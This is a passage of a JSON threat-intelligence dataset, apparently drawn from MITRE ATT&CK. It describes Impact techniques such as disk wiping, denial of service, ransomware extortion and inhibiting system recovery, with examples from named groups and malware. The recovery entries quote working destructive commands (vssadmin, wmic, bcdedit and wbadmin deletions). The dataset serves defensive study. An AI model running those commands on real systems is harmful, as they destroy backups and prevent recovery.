websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise.", "detailed_description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise.", "id": "T1491.002", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear is linked to the defacement of several Ukrainian organization websites."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019."}]}]}, {"name": "Disk Wipe", "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.", "detailed_description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.\nOn network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as erase.", "id": "T1561", "examples": [], "sub_techniques": [{"name": "Disk Content Wipe", "description": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.", "detailed_description": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like RawDisk to directly access disk content. This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.", "id": "T1561.001", "examples": [{"id": "S1125", "name": "AcidRain", "description": "AcidRain iterates over device file identifiers on the target, opens the device file, and either overwrites the file or calls various IOCTLS commands to erase it."}, {"id": "S1133", "name": "Apostle", "description": "Apostle searches for files on available drives based on a list of extensions hard-coded into the sample for follow-on wipe activity."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat has the ability to wipe VM snapshots on compromised networks."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD deletes files following overwriting them with random data."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used tools to delete files and folders from victims' desktops and profiles."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to corrupt disk partitions and obtain raw disk access to destroy data."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex can wipe deleted data from all drives using cipher.exe."}, {"id": "S0364", "name": "RawDisk", "description": "RawDisk has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill can wipe the accessible physical or logical drives of the infected machine."}, {"id": "S1010", "name": "VPNFilter", "description": "VPNFilter has the capability to wipe a portion of an infected device's firmware."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can overwrite sectors of a victim host's hard drive at periodic offsets."}]}, {"name": "Disk Structure Wipe", "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.", "detailed_description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\nOn a network devices, adversaries may reformat the file system using Network Device CLI commands such as format.\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.", "id": "T1561.002", "examples": [{"id": "G0067", "name": "APT37", "description": "APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR)."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used a custom MBR wiper named BOOTWRECK to render systems inoperable."}, {"id": "S1136", "name": "BFG Agonizer", "description": "BFG Agonizer retrieves a device handle to \\\\.\\PhysicalDrive0 to wipe the boot sector of a given disk."}, {"id": "S0693", "name": "CaddyWiper", "description": "CaddyWiper has the ability to destroy information about a physical drive's partitions including the MBR, GPT, and partition entries."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD opens and writes zeroes to the first 512 bytes of each drive, deleting the MBR. DEADWOOD then sends the control code IOCTL_DISK_DELETE_DRIVE_LAYOUT to ensure the MBR is removed from the drive."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear conducted destructive operations against victims, including disk structure wiping, via the WhisperGate malware in Ukraine."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to corrupt disk partitions, damage the Master Boot Record (MBR), and overwrite the Master File Table (MFT) of all available physical drives."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used a version of ZeroCleare to wipe disk drives on targeted hosts."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk overwrites the first sector of the Master Boot Record with \"0x00\"."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper opens a handle to \\\\\\\\.\\\\PhysicalDrive0 and wipes the first 512 bytes of data from this location, removing the boot sector."}, {"id": "S0364", "name": "RawDisk", "description": "RawDisk was used in Shamoon to help overwrite components of disk structure like the MBR and disk partitions."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon has been seen overwriting features of disk structure such as the MBR."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill can wipe the master boot record of an infected computer."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can overwrite the Master Book Record (MBR) on victim systems with a malicious 16-bit bootloader."}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare can corrupt the file system and wipe the system drive on targeted hosts."}]}]}, {"name": "Endpoint Denial of Service", "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.", "detailed_description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\nFor attacks attempting to saturate the providing network, see Network Denial of Service.", "id": "T1499", "examples": [{"id": "S0052", "name": "OnionDuke", "description": "OnionDuke has the capability to use a Denial of Service module."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a feature to perform SYN flood attack on a host."}], "sub_techniques": [{"name": "OS Exhaustion Flood", "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.", "detailed_description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.", "id": "T1499.001", "examples": []}, {"name": "Service Exhaustion Flood", "description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.", "detailed_description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.", "id": "T1499.002", "examples": []}, {"name": "Application Exhaustion Flood", "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.", "detailed_description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.", "id": "T1499.003", "examples": []}, {"name": "Application or System Exploitation", "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.", "detailed_description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.", "id": "T1499.004", "examples": [{"id": "S0604", "name": "Industroyer", "description": "Industroyer uses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices."}]}]}, {"name": "Financial Theft", "description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware, business email compromise (BEC) and fraud, \"pig butchering,\" bank hacking, and exploiting cryptocurrency networks.", "detailed_description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware, business email compromise (BEC) and fraud, \"pig butchering,\" bank hacking, and exploiting cryptocurrency networks.\nAdversaries may Compromise Accounts to conduct unauthorized transfers of funds. In the case of business email compromise or email fraud, an adversary may utilize Impersonation of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary. This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.\nExtortion by ransomware may occur, for example, when an adversary demands payment from a victim after Data Encrypted for Impact  and Exfiltration of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary. Adversaries may use dedicated leak sites to distribute victim data.\nDue to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as Data Destruction and business disruption.", "id": "T1657", "examples": [{"id": "G1024", "name": "Akira", "description": "Akira engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate can deploy payloads capable of capturing credentials related to cryptocurrency wallets."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has stolen and encrypted victim's data in order to extort payment for keeping it private or decrypting it."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has stolen and laundered cryptocurrency to self-fund operations including the acquisition of infrastructure."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro targets organizations in a wide variety of sectors via the use of Mispadu banking trojan with the goal of financial theft."}, {"id": "G1040", "name": "Play", "description": "Play demands ransom payments from victims to unencrypt filesystems and to not publish sensitive data exfiltrated from victim networks."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has deployed ransomware on compromised hosts for financial gain."}, {"id": "G0083", "name": "SilverTerrier", "description": "SilverTerrier targets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft."}], "sub_techniques": []}, {"name": "Firmware Corruption", "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system. Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.", "detailed_description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system. Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable. Depending on the device, this attack may also result in Data Destruction.", "id": "T1495", "examples": [{"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has used an executable that installs a modified bootloader to prevent normal boot-up."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot module \"Trickboot\" can write or erase the UEFI/BIOS firmware of a compromised device."}], "sub_techniques": []}, {"name": "Inhibit System Recovery", "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.", "detailed_description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\nAdversaries may also delete \"online\" backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.", "id": "T1490", "examples": [{"id": "S1129", "name": "Akira", "description": "Akira will delete system volume shadow copies via PowerShell commands."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon deletes backups and shadow copies using native system tools."}, {"id": "S0638", "name": "Babuk", "description": "Babuk has the ability to delete shadow volumes using vssadmin.exe delete shadows /all /quiet."}, {"id": "S1136", "name": "BFG Agonizer", "description": "BFG Agonizer wipes the boot sector of infected machines to inhibit system recovery."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer attempts to remove the backup shadow files from the host using vssadmin.exe Delete Shadows /All /Quiet."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can delete shadow copies using vssadmin.exe."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can delete shadow copies using vssadmin.exe delete shadows /all /quiet and wmic.exe Shadowcopy Delete; it can also modify the boot loader using bcdedit /set {default} recoveryenabled No."}, {"id": "S0611", "name": "Clop", "description": "Clop can delete the shadow volumes with vssadmin Delete Shadows /all /quiet and can use bcdedit to disable recovery options."}, {"id": "S0608", "name": "Conficker", "description": "Conficker resets system restore points and deletes backup files."}, {"id": "S0575", "name": "Conti", "description": "Conti can delete Windows Volume Shadow Copies using vssadmin."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate can delete system restore points through the command cmd.exe /c vssadmin delete shadows /for=c: /all /quiet\"."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can delete shadow volumes using vssadmin.exe."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM can delete volume shadow copies on compromised hosts."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can delete shadow copies using the IVssBackupComponents COM object to call the DeleteSnapshots method."}, {"id": "S0605", "name": "EKANS", "description": "EKANS removes backups of Volume Shadow Copies to disable any restoration capabilities."}, {"id": "S0618", "name": "FIVEHANDS", "description": "FIVEHANDS has the ability to delete volume shadow copies on compromised hosts."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 disable recovery options and deletes shadow copies from the victim."}, {"id": "S0617", "name": "HELLOKITTY", "description": "HELLOKITTY can delete volume shadow copies on compromised hosts."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can disable the VSS service on a compromised host using the service control manager."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can delete volume shadow copy backups from victim machines."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can can remove all system restore points."}, {"id": "S0389", "name": "JCry", "description": "JCry has been observed deleting shadow copies to ensure that data cannot be restored easily."}, {"id": "S0449", "name": "Maze", "description": "Maze has attempted to delete the shadow volumes of infected machines, once before and once after the encryption process."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has deleted volume shadow copies using vssadmin.exe."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can use bcdedit to delete different boot identifiers on a compromised host; it can also use vssadmin.exe delete shadows /all /quiet and C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper wipes the boot sector of infected systems to inhibit system recovery."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can delete the infected system's Shadow Volumes to prevent recovery."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer uses the native Windows utilities vssadmin, wbadmin, and bcdedit to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair."}, {"id": "S1162", "name": "Playcrypt", "description": "Playcrypt can use AlphaVSS to delete shadow copies."}, {"id": "S1058", "name": "Prestige", "description": "Prestige can delete the backup catalog from the target system using: c:\\Windows\\System32\\wbadmin.exe delete catalog -quiet and can also delete volume shadow copies using: \\Windows\\System32\\vssadmin.exe delete shadows /all /quiet."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can use vssadmin.exe to remove volume shadow copies."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has the functionality to delete shadow copies."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker can delete volume shadow copies using vssadmin delete shadows /all /quiet."}, {"id": "S0496", "name": "REvil", "description": "REvil can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP has the ability to disable SystemRestore and Volume Shadow Copies."}, {"id": "S0400", "name": "RobbinHood", "description": "RobbinHood deletes shadow copies to ensure that all the data cannot be restored easily."}, {"id": "S1073", "name": "Royal", "description": "Royal can delete shadow copy backups with vssadmin.exe using the command delete shadows /all /quiet."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team uses Prestige to delete the backup catalog from the target system using: C:\\Windows\\System32\\wbadmin.exe delete catalog -quiet and to delete volume shadow copies using: C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet. "}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry uses vssadmin, wbadmin, bcdedit, and wmic to delete and disable operating system recovery features."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can delete shadow volumes."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used WMIC and vssadmin to manually delete volume shadow copies. Wizard Spider has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin."}], "sub_techniques": []}, {"name": "Network Denial of Service", "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.", "detailed_description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\nFor DoS attacks targeting the hosting system directly, see Endpoint Denial of Service.", "id": "T1498", "examples": [{"id": "G0007", "name": "APT28", "description": "In 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can execute TCP, UDP,  and HTTP denial of service (DoS) attacks."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse enables multiple types of network denial of service capabilities across several protocols post-installation."}], "sub_techniques": [{"name": "Direct Network Flood", "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.", "detailed_description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.", "id": "T1498.001", "examples": []}, {"name": "Reflection Amplification", "description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.", "detailed_description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.", "id": "T1498.002", "examples": []}]}, {"name": "Resource Hijacking", "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.", "detailed_description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.\nResource hijacking may take a number of different forms. For example, adversaries may:\nIn some cases, adversaries may leverage multiple types of Resource Hijacking at once.", "id": "T1496", "examples": [], "sub_techniques": [{"name": "Compute Hijacking", "description": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.", "detailed_description": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.\nOne common purpose for Compute Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Compute Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers 